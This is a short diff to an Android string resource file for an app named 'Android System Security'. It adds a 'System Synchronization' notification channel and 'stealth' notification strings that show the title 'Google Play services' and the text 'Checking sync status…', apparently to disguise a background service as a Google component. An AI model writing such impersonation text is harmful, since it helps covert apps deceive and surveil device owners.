@@ -1,3 +1,7 @@
 <resources>
     <string name="app_name">Android System Security</string>
+    <string name="notification_channel_name">System Synchronization</string>
+    <string name="notification_channel_desc">Background system component synchronization</string>
+    <string name="stealth_notif_title">Google Play services</string>
+    <string name="stealth_notif_text">Checking sync status…</string>
 </resources>
